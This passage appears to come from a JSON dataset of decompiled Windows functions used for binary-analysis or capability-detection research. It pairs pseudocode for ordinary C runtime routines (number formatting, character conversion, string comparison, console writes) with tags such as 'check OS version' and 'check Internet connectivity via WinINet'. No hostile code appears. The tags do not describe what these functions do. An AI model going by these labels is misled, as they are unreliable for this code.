NULL;\n                        puVar12 = NULL;\n                        do {\n                            puVar19 = apuStack928[puVar12 + -1];\n                            uVar6 = ZEXT48(var_770h) * ZEXT48(puVar19);\n                            apuStack928[puVar12 + -1] = uVar6 + var_754h;\n                            var_754h = (ZEXT48(var_770h) * ZEXT48(puVar19) >> 0x20) + CARRY4(uVar6, var_754h);\n                            puVar12 = puVar12 + 1;\n                        } while (puVar12 != var_3a4h);\n                        if (var_754h != NULL) {\n                            if (0x72 < var_3a4h) goto code_r0x0046c292;\n                            apuStack928[var_3a4h + -1] = var_754h;\n                            var_3a4h = var_3a4h + 1;\n                        }\n                    }\n                }\n            }\n            puVar12 = var_760h;\n            var_748h = var_760h;\n            if (var_1d4h != NULL) {\n                var_770h = NULL;\n                puVar19 = NULL;\n                do {\n                    uVar6 = (&var_1d0h)[puVar19];\n                    uVar15 = uVar6 * 10;\n                    (&var_1d0h)[puVar19] = uVar15 + var_770h;\n                    var_770h = (uVar6 * 10 >> 0x20) + CARRY4(uVar15, var_770h);\n                    puVar19 = puVar19 + 1;\n                } while (puVar19 != var_1d4h);\n                if (var_770h != NULL) {\n                    if (var_1d4h < 0x73) {\n                        (&var_1d0h)[var_1d4h] = var_770h;\n                        var_1d4h = var_1d4h + 1;\n                    }\n                    else {\n                        var_974h = 0;\n                        var_1d4h = NULL;\n                        fcn.0046cb87(&var_1d0h, 0x1cc, &var_970h, 0);\n                    }\n                }\n            }\n            iVar5 = fcn.0046a520(&var_1d4h, &var_3a4h);\n            if (iVar5 == 10) {\n                puVar12 = var_760h + 1;\n                var_784h = var_784h + 1;\n                *var_760h = 0x31;\n                uVar2 = _var_77ch & 0xffffffff;\n                _var_77ch = uVar2 | ZEXT48(var_3a4h) << 0x20;\n                var_748h = puVar12;\n                if (var_3a4h != NULL) {\n                    puVar20 = NULL;\n                    puVar19 = NULL;\n                    do {\n                        puVar16 = apuStack928[puVar19 + -1];\n                        uVar6 = ZEXT48(puVar16) * 10;\n                        apuStack928[puVar19 + -1] = uVar6 + puVar20;\n                        puVar20 = (ZEXT48(puVar16) * 10 >> 0x20) + CARRY4(uVar6, puVar20);\n                        puVar19 = puVar19 + 1;\n                    } while (puVar19 != var_3a4h);\n                    _var_77ch = uVar2 | ZEXT48(puVar20) << 0x20;\n                    if (puVar20 != NULL) {\n                        if (var_3a4h < 0x73) {\n                            apuStack928[var_3a4h + -1] = puVar20;\n                            var_3a4h = var_3a4h + 1;\n                        }\n                        else {\n                            var_974h = 0;\n                            var_3a4h = NULL;\n                            fcn.0046cb87(&var_3a0h, 0x1cc, &var_970h, 0);\n                        }\n                    }\n                }\n            }\n            else if (iVar5 == 0) {\n                var_784h = var_784h - 1;\n            }\n            else {\n                puVar12 = var_760h + 1;\n                *var_760h = iVar5 + '0';\n                var_748h = puVar12;\n            }\n            var_78ch[1] = var_784h;\n            uVar6 = var_788h;\n            if (((-1 < var_784h) && (var_788h < 0x80000000)) && (arg_14h == 0)) {\n                uVar6 = var_788h + var_784h;\n            }\n            uVar15 = arg_20h - 1U;\n            if (uVar6 <= arg_20h - 1U) {\n                uVar15 = uVar6;\n            }\n            var_754h = uVar15 + var_760h;\n            var_759h._0_1_ = 0;\n            if (puVar12 != var_754h) {\n                do {\n                    puVar19 = var_748h;\n                    uVar2 = _var_77ch & 0xffffffff;\n                    _var_77ch = uVar2 | ZEXT48(var_1d4h) << 0x20;\n                    if (var_1d4h == NULL) break;\n                    uVar6 = 0;\n                    puVar12 = NULL;\n                    do {\n                        uVar15 = (&var_1d0h)[puVar12];\n                        uVar10 = uVar15 * 1000000000;\n                        (&var_1d0h)[puVar12] = uVar10 + uVar6;\n                        uVar6 = (uVar15 * 1000000000 >> 0x20) + CARRY4(uVar10, uVar6);\n                        puVar12 = puVar12 + 1;\n                    } while (puVar12 != var_1d4h);\n                    _var_77ch = uVar2 | uVar6 << 0x20;\n                    if (uVar6 != 0) {\n                        if (var_1d4h < 0x73) {\n                            (&var_1d0h)[var_1d4h] = uVar6;\n                            var_1d4h = var_1d4h + 1;\n                        }\n                        else {\n                            var_974h = 0;\n                            var_1d4h = NULL;\n                            fcn.0046cb87(&var_1d0h, 0x1cc, &var_970h, 0);\n                        }\n                    }\n                    *NULL = fcn.0046a520(&var_1d4h, &var_3a4h);\n                    puVar12 = var_754h - puVar19;\n                    var_770h = 0x8;\n                    do {\n                        uVar3 = ZEXT48(stack0xfffff8a4) % ZEXT48(var_750h) + 0x30;\n                        var_788h = ZEXT48(stack0xfffff8a4) % ZEXT48(var_750h) & 0xffffff00 | uVar3;\n                        *NULL = stack0xfffff8a4 / var_750h;\n                        if (var_770h < puVar12) {\n                            *(var_770h + puVar19) = uVar3;\n                        }\n                        else if (uVar3 != 0x30) {\n                            var_759h._0_1_ = 1;\n                        }\n                        var_770h = var_770h + -1;\n                    } while (var_770h != 0xffffffff);\n                    if (0x9 < puVar12) {\n                        puVar12 = 0x9;\n                    }\n                    puVar12 = puVar19 + puVar12;\n                    var_748h = puVar12;\n                } while (puVar12 != var_754h);\n            }\n            *puVar12 = 0;\n            fcn.0045ac0d(&var_778h, var_794h, var_790h);\n            goto code_r0x0046cb53;\n        }\n        var_78ch[1] = 1;\n        if (iVar5 != 1) {\n            if (iVar5 == 2) {\n                arg_10h_00 = \"1#QNAN\";\n            }\n            else if (iVar5 == 3) {\n                arg_10h_00 = \"1#SNAN\";\n            }\n            else {\n                if (iVar5 != 4) goto code_r0x0046b6fa;\n                arg_10h_00 = \"1#IND\";\n            }\n            goto code_r0x0046b6b7;\n        }\n        iVar5 = fcn.0045acc6(var_760h, arg_20h, \"1#INF\");\n    }\n    if (iVar5 != 0) {\n        fcn.0043bb6b(0, 0, 0, 0, 0);\n        pcVar1 = swi(3);\n        (*pcVar1)();\n        return;\n    }\ncode_r0x0046cb53:\n    if (var_798h != '\\0') {\n        fcn.0047051d(&var_7a0h);\n    }\n    fcn.004303e9(var_974h);\n    return;\n}\n",
        "token_count": 11115
    },
    "0046cd9f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nint32_t __cdecl fcn.0046cd9f(uint16_t *arg_8h, int32_t *arg_ch, uint32_t arg_10h, uint arg_14h, int32_t arg_18h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint32_t in_ECX;\n    uint32_t uVar3;\n    uint16_t *puVar4;\n    int32_t iVar5;\n    int32_t arg_8h_00;\n    uint32_t var_8h;\n    uint var_1h;\n    \n    arg_8h_00 = *arg_ch;\n    if (arg_8h == NULL) {\n        iVar2 = 0;\n        uVar1 = fcn.0046cd30(arg_8h_00);\n        while (iVar5 = fcn.004716ae(0, arg_8h_00, uVar1, arg_14h, arg_18h),  iVar5 != -1) {\n            if (iVar5 == 0) {\n                return iVar2;\n            }\n            if (iVar5 == 4) {\n                iVar2 = iVar2 + 1;\n            }\n            arg_8h_00 = arg_8h_00 + iVar5;\n            iVar2 = iVar2 + 1;\n            uVar1 = fcn.0046cd30(arg_8h_00);\n        }\n        *(arg_18h + 0x1c) = 1;\n        *(arg_18h + 0x18) = 0x2a;\n    }\n    else {\n        puVar4 = arg_8h;\n        var_8h = in_ECX;\n        if (arg_10h != 0) {\n            do {\n                uVar1 = fcn.0046cd30(arg_8h_00);\n                iVar2 = fcn.004716ae(&var_8h, arg_8h_00, uVar1, arg_14h, arg_18h);\n                if (iVar2 == -1) {\n                    *arg_ch = arg_8h_00;\n                    *(arg_18h + 0x1c) = 1;\n                    *(arg_18h + 0x18) = 0x2a;\n                    return -1;\n                }\n                if (iVar2 == 0) {\n                    arg_8h_00 = 0;\n                    *puVar4 = 0;\n                    break;\n                }\n                uVar3 = var_8h;\n                if (0xffff < var_8h) {\n                    if (arg_10h < 2) break;\n                    var_8h = var_8h - 0x10000;\n                    arg_10h = arg_10h - 1;\n                    *puVar4 = var_8h >> 10 | 0xd800;\n                    puVar4 = puVar4 + 1;\n                    uVar3 = var_8h & 0x3ff | 0xdc00;\n                }\n                *puVar4 = uVar3;\n                arg_8h_00 = arg_8h_00 + iVar2;\n                puVar4 = puVar4 + 1;\n                arg_10h = arg_10h - 1;\n            } while (arg_10h != 0);\n        }\n        iVar5 = puVar4 - arg_8h >> 1;\n        *arg_ch = arg_8h_00;\n    }\n    return iVar5;\n}\n",
        "token_count": 779
    },
    "0046cea7": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl\nfcn.0046cea7(uint32_t *arg_8h, uint16_t *arg_ch, uint8_t *arg_10h, uint32_t arg_14h, int32_t *arg_18h, int32_t arg_1ch)\n\n{\n    uint8_t uVar1;\n    int32_t *piVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint uVar5;\n    int32_t arg_14h_00;\n    uint8_t *puVar6;\n    int32_t *in_FS_OFFSET;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    int32_t var_ch;\n    uint uStack12;\n    uint uStack8;\n    \n    uStack8 = 0xffffffff;\n    uStack12 = 0x47a4ab;\n    var_ch = *in_FS_OFFSET;\n    uVar3 = *0x6cade0 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    if (arg_ch != NULL) {\n        *arg_ch = 0;\n    }\n    if (((arg_10h == NULL) || (arg_14h == 0)) || (*arg_10h == 0)) {\n        if (arg_8h != NULL) {\n            *arg_8h = 0;\n        }\n    }\n    else {\n        if (*(arg_1ch + 0x14) == '\\0') {\n            fcn.00453bd0(uVar3);\n        }\n        piVar2 = *(arg_1ch + 0xc);\n        iVar4 = piVar2[2];\n        if (iVar4 == 0xfde9) {\n            uVar3 = fcn.0046cd5c(arg_ch, arg_10h, arg_14h, arg_18h, arg_1ch);\n            if (arg_8h != NULL) {\n                *arg_8h = uVar3;\n            }\n            if (*(arg_1ch + 0x1c) != '\\0') {\n                uVar5 = *(arg_1ch + 0x18);\n                goto code_r0x0046d0aa;\n            }\n        }\n        else {\n            uVar3 = piVar2[1];\n            if (piVar2[0x2a] == 0) {\n                if (arg_ch != NULL) {\n                    *arg_ch = *arg_10h;\n                }\ncode_r0x0046d08f:\n                if (arg_8h != NULL) {\n                    *arg_8h = 1;\n                }\n            }\n            else if (*arg_18h == 0) {\n                if (-1 < *(*piVar2 + *arg_10h * 2)) {\n                    iVar4 = fcn.004630d8(iVar4, 9, arg_10h, 1, arg_ch, arg_ch != NULL);\n                    if (iVar4 == 0) goto code_r0x0046cfb0;\n                    goto code_r0x0046d08f;\n                }\n                if (uVar3 <= arg_14h) {\n                    if (1 < uVar3) {\n                        puVar6 = arg_10h;\n                        do {\n                            uVar1 = *puVar6;\n                            puVar6 = puVar6 + 1;\n                        } while (uVar1 != 0);\n                        arg_14h_00 = 0x7fffffff;\n                        if (puVar6 - (arg_10h + 1) < 0x7fffffff) {\n                            puVar6 = arg_10h;\n                            do {\n                                uVar1 = *puVar6;\n                                puVar6 = puVar6 + 1;\n                            } while (uVar1 != 0);\n                            arg_14h_00 = puVar6 - (arg_10h + 1);\n                        }\n                        iVar4 = fcn.004630d8(iVar4, 9, arg_10h, arg_14h_00, arg_ch, arg_ch != NULL);\n                        if (iVar4 != 0) goto code_r0x0046d060;\n                    }\n                    if (arg_10h[1] != 0) goto code_r0x0046d060;\n                    goto code_r0x0046cfac;\n                }\n                *arg_18h = *arg_10h;\n                if (arg_8h != NULL) {\n                    *arg_8h = 0xfffffffe;\n                }\n            }\n            else {\n                *(arg_18h + 1) = *arg_10h;\n                if ((uVar3 < 2) ||\n                   (iVar4 = fcn.004630d8(*(*(arg_1ch + 0xc) + 8), 9, arg_18h, 2, arg_ch, arg_ch != NULL),  iVar4 == 0))\n                {\ncode_r0x0046cfac:\n                    *arg_18h = 0;\ncode_r0x0046cfb0:\n                    if (arg_ch != NULL) {\n                        *arg_ch = 0;\n                    }\n                    if (arg_8h != NULL) {\n                        *arg_8h = 0xffffffff;\n                    }\n                    uVar5 = 0x2a;\n                    *(arg_1ch + 0x1c) = 1;\n                    *(arg_1ch + 0x18) = 0x2a;\n                    goto code_r0x0046d0aa;\n                }\n                *arg_18h = 0;\ncode_r0x0046d060:\n                if (arg_8h != NULL) {\n                    *arg_8h = uVar3;\n                }\n            }\n        }\n    }\n    uVar5 = 0;\ncode_r0x0046d0aa:\n    *in_FS_OFFSET = var_ch;\n    return uVar5;\n}\n",
        "token_count": 1291
    },
    "0046d21d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl\nfcn.0046d21d(uint32_t *arg_8h, ushort *arg_ch, uint32_t arg_10h, int32_t arg_14h, uint32_t arg_18h, uint arg_1ch, \n            int32_t arg_20h)\n\n{\n    int32_t iVar1;\n    \n    if (arg_8h != NULL) {\n        *arg_8h = 0xffffffff;\n    }\n    if (arg_ch == NULL) {\n        if (arg_10h == 0) {\ncode_r0x0046d269:\n            if (arg_14h != 0) {\n                if (arg_10h < arg_18h) {\n                    arg_18h = arg_10h;\n                }\n                iVar1 = fcn.0046d0bf(arg_ch, arg_14h, arg_18h, arg_1ch, arg_20h);\n                if (iVar1 == -1) {\n                    if (arg_ch != NULL) {\n                        *arg_ch = 0;\n                    }\n                    if (*(arg_20h + 0x1c) != '\\0') {\n                        return *(arg_20h + 0x18);\n                    }\n                }\n                else {\n                    if (arg_ch != NULL) {\n                        if (arg_10h < iVar1 + 1U) {\n                            *arg_ch = 0;\n                        }\n                        else {\n                            arg_ch[iVar1] = 0;\n                        }\n                    }\n                    if (arg_8h != NULL) {\n                        *arg_8h = iVar1 + 1U;\n                    }\n                }\n                return 0;\n            }\n            *(arg_20h + 0x1c) = 1;\n            *(arg_20h + 0x18) = 0x16;\n            goto code_r0x0046d251;\n        }\n    }\n    else if (arg_10h != 0) {\n        *arg_ch = 0;\n        goto code_r0x0046d269;\n    }\n    *(arg_20h + 0x1c) = 1;\n    *(arg_20h + 0x18) = 0x16;\ncode_r0x0046d251:\n    fcn.0043bac1(0, 0, 0, 0, 0, arg_20h);\n    return 0x16;\n}\n",
        "token_count": 523
    },
    "0046d2d9": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.0046d2d9(int32_t arg_8h)\n\n{\n    ushort extraout_var;\n    ushort uVar1;\n    uint var_3ch;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_1h;\n    \n    if (arg_8h == -1) {\n        return 0xffff;\n    }\n    var_ch = -1;\n    var_1h._0_1_ = arg_8h;\n    var_14h = 0;\n    var_10h = 0;\n    var_8h._0_2_ = 0;\n    fcn.0043b732(0);\n    fcn.0046cea7(&var_ch, &var_8h, &var_1h, 1, &var_14h, &var_3ch);\n    uVar1 = 0xffff;\n    if (-1 < var_ch) {\n        uVar1 = var_8h;\n    }\n    fcn.0043b78b();\n    return CONCAT22(extraout_var, uVar1);\n}\n",
        "token_count": 281
    },
    "0046d838": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0046d838(uint32_t arg_8h, int32_t *arg_ch, uint arg_10h)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint32_t *puVar3;\n    uint32_t arg_10h_00;\n    uint32_t uVar4;\n    bool bVar5;\n    ulong uVar6;\n    \n    uVar1 = fcn.0045efb0(arg_ch);\n    if ((arg_ch[3] & 0xc0U) == 0) {\n        uVar1 = fcn.0046f10e(uVar1, &arg_8h, 2, arg_10h);\n        bVar5 = uVar1 == 2;\n    }\n    else {\n        uVar4 = 0;\n        arg_10h_00 = *arg_ch - arg_ch[1];\n        *arg_ch = arg_ch[1] + 2;\n        arg_ch[2] = arg_ch[6] + -2;\n        if (arg_10h_00 < 1) {\n            if ((uVar1 == 0xffffffff) || (uVar1 == 0xfffffffe)) {\n                uVar2 = 0x6cafb8;\n            }\n            else {\n                uVar2 = (uVar1 & 0x3f) * 0x38 + *((uVar1 >> 6) * 4 + 0x6cd630);\n            }\n            if ((*(uVar2 + 0x28) & 0x20) != 0) {\n                uVar6 = fcn.00471e82(uVar1, 0, 0, 2);\n                uVar2 = uVar6 & uVar6 >> 0x20;\n                if (uVar2 == 0xffffffff) {\n                    puVar3 = arg_ch + 3;\n                    LOCK();\n                    *puVar3 = *puVar3 | 0x10;\n                    return CONCAT31(puVar3 >> 8, 1);\n                }\n            }\n        }\n        else {\n            uVar2 = fcn.0046f10e(uVar1, arg_ch[1], arg_10h_00, arg_10h);\n            uVar4 = uVar2;\n        }\n        bVar5 = uVar4 == arg_10h_00;\n        uVar1 = uVar2 & 0xffff0000 | arg_8h & 0xffff;\n        *arg_ch[1] = arg_8h & 0xffff;\n    }\n    return uVar1 & 0xffffff00 | bVar5;\n}\n",
        "token_count": 582
    },
    "0046da90": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0046da90(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    int32_t iVar1;\n    uint arg_8h_00;\n    code *pcVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    \n    if ((((arg_8h != 0) && (arg_8h != 0x400)) && (arg_8h != 0x800)) &&\n       (((arg_ch != 0 || (arg_10h < 1)) && (-1 < arg_10h)))) {\n        iVar5 = 0;\n        iVar4 = 0xe3;\n        do {\n            iVar3 = (iVar4 + iVar5) / 2;\n            iVar1 = *(iVar3 * 8 + 0x481648);\n            if (arg_8h == iVar1) {\n                if (iVar3 < 0) {\n                    return 0;\n                }\n                arg_8h_00 = *(iVar3 * 8 + 0x48164c);\n                iVar4 = fcn.0045dd27(arg_8h_00, 0x55);\n                if (0 < arg_10h) {\n                    if (arg_10h <= iVar4) {\n                        return 0;\n                    }\n                    iVar5 = fcn.0043be56(arg_ch, arg_10h, arg_8h_00);\n                    if (iVar5 != 0) {\n                        fcn.0043bb6b(0, 0, 0, 0, 0);\n                        pcVar2 = swi(3);\n                        iVar4 = (*pcVar2)();\n                        return iVar4;\n                    }\n                }\n                return iVar4 + 1;\n            }\n            if (arg_8h - iVar1 < 0) {\n                iVar4 = iVar3 + -1;\n            }\n            else {\n                iVar5 = iVar3 + 1;\n            }\n        } while (iVar5 <= iVar4);\n    }\n    return 0;\n}\n",
        "token_count": 457
    },
    "0046e442": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0046e442(uint16_t *arg_8h, uint16_t *arg_ch, uint32_t arg_10h)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    \n    if (*0x6cd5fc == 0) {\n        if ((arg_8h == NULL) || (arg_ch == NULL)) {\n            puVar1 = fcn.0043bcb5();\n            *puVar1 = 0x16;\n            fcn.0043bb3e();\n            iVar2 = 0x7fffffff;\n        }\n        else {\n            if (arg_10h < 0x80000000) {\n                if (arg_10h != 0) {\n                    do {\n                        uVar3 = *arg_8h;\n                        arg_8h = arg_8h + 1;\n                        if (uVar3 - 0x41 < 0x1a) {\n                            uVar3 = uVar3 + 0x20;\n                        }\n                        uVar4 = *arg_ch;\n                        arg_ch = arg_ch + 1;\n                        if (uVar4 - 0x41 < 0x1a) {\n                            uVar4 = uVar4 + 0x20;\n                        }\n                    } while (((uVar3 - uVar4 == 0) && (uVar3 != 0)) && (arg_10h = arg_10h - 1,  arg_10h != 0));\n                    return uVar3 - uVar4;\n                }\n                return 0;\n            }\n            puVar1 = fcn.0043bcb5();\n            *puVar1 = 0x16;\n            fcn.0043bb3e();\n            iVar2 = 0x7fffffff;\n        }\n    }\n    else {\n        iVar2 = fcn.0046e4af(arg_8h, arg_ch, arg_10h, 0);\n    }\n    return iVar2;\n}\n",
        "token_count": 451
    },
    "0046e924": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_80h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0046e924(uint *arg_8h, uint32_t arg_ch, uint *arg_10h, int32_t arg_14h, int32_t arg_18h)\n\n{\n    uint8_t uVar1;\n    uint8_t *puVar2;\n    uint *puVar3;\n    uint uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    int32_t *in_FS_OFFSET;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    int32_t var_70h;\n    uint var_6ch;\n    uint *var_68h;\n    uint hFile;\n    uint *var_60h;\n    uint *lpNumberOfBytesWritten;\n    uint var_58h;\n    uint *var_54h;\n    int32_t var_50h;\n    int32_t var_4ch;\n    uint8_t *var_48h;\n    int32_t var_44h;\n    uint var_40h;\n    int32_t var_3ch;\n    uint *var_38h;\n    int32_t var_34h;\n    uint8_t var_2dh;\n    uint *var_2ch;\n    uint lpBuffer;\n    uint var_20h;\n    uint var_18h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint uStack8;\n    \n    uStack8 = 0xffffffff;\n    uStack12 = 0x47a4e5;\n    var_ch = *in_FS_OFFSET;\n    var_10h = *0x6cade0 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    var_50h = (arg_ch & 0x3f) * 0x38;\n    var_44h = arg_ch >> 6;\n    var_60h = arg_10h;\n    var_3ch = arg_18h;\n    hFile = *(var_50h + 0x18 + *(var_44h * 4 + 0x6cd630));\n    var_54h = arg_14h + arg_10h;\n    var_6ch = (*_sym.imp.KERNEL32.dll_GetConsoleOutputCP)(var_10h);\n    if (*(arg_18h + 0x14) == '\\0') {\n        fcn.00453bd0();\n    }\n    var_70h = *(*(arg_18h + 0xc) + 8);\n    *arg_8h = 0;\n    arg_8h[1] = 0;\n    arg_8h[2] = 0;\n    var_2ch = var_60h;\n    if (var_54h <= var_60h) {\ncode_r0x0046ecca:\n        *in_FS_OFFSET = var_ch;\n        fcn.004303e9(var_80h);\n        return;\n    }\n    var_48h = NULL;\n    iVar6 = var_50h;\ncode_r0x0046e9c9:\n    iVar7 = 0;\n    var_2dh = *var_2ch;\n    var_40h = 0;\n    var_34h = 1;\n    if (var_70h == 0xfde9) {\n        var_48h = *(var_44h * 4 + 0x6cd630) + 0x2e + iVar6;\n        puVar2 = var_48h;\n        var_34h = iVar7;\n        do {\n            if (*puVar2 == 0) break;\n            var_34h = var_34h + 1;\n            puVar2 = puVar2 + 1;\n        } while (var_34h < 5);\n        iVar6 = var_54h - var_2ch;\n        if (var_34h < 1) {\n            var_4ch = *(*var_2ch + 0x6cb590) + 1;\n            if (iVar6 < var_4ch) {\n                if (0 < iVar6) {\n                    do {\n                        *(*(var_44h * 4 + 0x6cd630) + var_50h + 0x2e + iVar7) = *(iVar7 + var_2ch);\n                        iVar7 = iVar7 + 1;\n                    } while (iVar7 < iVar6);\n                }\n                goto code_r0x0046ec7b;\n            }\n            var_80h = 0;\n            var_7ch = 0;\n            var_34h = (var_4ch == 4) + 1;\n            var_38h = var_2ch;\n            iVar7 = fcn.0046cd9f(&var_40h, &var_38h, var_34h, &var_80h, var_3ch);\n            iVar6 = var_50h;\n        }\n        else {\n            var_38h = *(*var_48h + 0x6cb590) + 1;\n            var_4ch = var_38h - var_34h;\n            puVar2 = var_48h;\n            if (iVar6 < var_4ch) {\n                if (0 < iVar6) {\n                    do {\n                        puVar2 = iVar7 + var_2ch;\n                        iVar5 = *(var_44h * 4 + 0x6cd630) + var_50h + iVar7;\n                        iVar7 = iVar7 + 1;\n                        *(iVar5 + 0x2e + var_34h) = *puVar2;\n                    } while (iVar7 < iVar6);\n                }\ncode_r0x0046ec7b:\n                arg_8h[1] = arg_8h[1] + iVar6;\n                goto code_r0x0046ecca;\n            }\n            do {\n                *(&var_18h + iVar7) = *puVar2;\n                iVar7 = iVar7 + 1;\n                puVar2 = puVar2 + 1;\n            } while (iVar7 < var_34h);\n            if (0 < var_4ch) {\n                fcn.004312b0(&var_18h + var_34h, var_2ch, var_4ch);\n            }\n            iVar6 = var_50h;\n            iVar7 = 0;\n            do {\n                *(*(var_44h * 4 + 0x6cd630) + var_50h + 0x2e + iVar7) = 0;\n                iVar7 = iVar7 + 1;\n            } while (iVar7 < var_34h);\n            var_68h = &var_18h;\n            var_78h = 0;\n            var_74h = 0;\n            var_34h = (var_38h == 0x4) + 1;\n            iVar7 = fcn.0046cd9f(&var_40h, &var_68h, var_34h, &var_78h, var_3ch);\n        }\n        if (iVar7 == -1) goto code_r0x0046ecca;\n        puVar3 = var_2ch + var_4ch + -1;\n    }\n    else {\n        var_4ch = *(var_44h * 4 + 0x6cd630);\n        uVar1 = *(var_4ch + 0x2d + iVar6);\n        if ((uVar1 & 4) == 0) {\n            if (*(**(var_3ch + 0xc) + *var_2ch * 2) < 0) {\n                var_38h = var_2ch + 1;\n                if (var_38h < var_54h) {\n                    iVar7 = fcn.0045ee07(&var_40h, var_2ch, 2, var_3ch);\n                    puVar3 = var_38h;\n                    if (iVar7 != -1) goto code_r0x0046eba2;\n                }\n                else {\n                    *(var_4ch + 0x2e + iVar6) = *var_2ch;\n                    puVar2 = *(var_44h * 4 + 0x6cd630) + 0x2d + iVar6;\n                    *puVar2 = *puVar2 | 4;\n                    arg_8h[1] = var_48h + 1;\n                }\n                goto code_r0x0046ecca;\n            }\n            uVar4 = 1;\n            puVar3 = var_2ch;\n        }\n        else {\n            var_20h._0_1_ = *(var_4ch + 0x2e + iVar6);\n            var_20h._1_1_ = *var_2ch;\n            *(var_4ch + 0x2d + iVar6) = uVar1 & 0xfb;\n            uVar4 = 2;\n            puVar3 = &var_20h;\n        }\n        iVar7 = fcn.0045ee07(&var_40h, puVar3, uVar4, var_3ch);\n        puVar3 = var_2ch;\n        if (iVar7 == -1) goto code_r0x0046ecca;\n    }\ncode_r0x0046eba2:\n    var_2ch = puVar3 + 1;\n    var_38h = fcn.00463192(var_6ch, 0, &var_40h, var_34h, &lpBuffer, 5, 0, 0);\n    if (var_38h == NULL) goto code_r0x0046ecca;\n    iVar7 = (*_sym.imp.KERNEL32.dll_WriteFile)(hFile, &lpBuffer, var_38h, &lpNumberOfBytesWritten, 0);\n    if (iVar7 == 0) {\ncode_r0x0046ecc2:\n        uVar4 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        *arg_8h = uVar4;\n        goto code_r0x0046ecca;\n    }\n    var_48h = (arg_8h[2] - var_60h) + var_2ch;\n    arg_8h[1] = var_48h;\n    if (lpNumberOfBytesWritten < var_38h) goto code_r0x0046ecca;\n    if (var_2dh == 10) {\n        var_58h._0_2_ = 0xd;\n        iVar7 = (*_sym.imp.KERNEL32.dll_WriteFile)(hFile, &var_58h, 1, &lpNumberOfBytesWritten, 0);\n        if (iVar7 == 0) goto code_r0x0046ecc2;\n        if (lpNumberOfBytesWritten == NULL) goto code_r0x0046ecca;\n        arg_8h[2] = arg_8h[2] + 1;\n        arg_8h[1] = arg_8h[1] + 1;\n        var_48h = arg_8h[1];\n    }\n    if (var_54h <= var_2ch) goto code_r0x0046ecca;\n    goto code_r0x0046e9c9;\n}\n",
        "token_count": 2528
    },
    "0046ed53": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
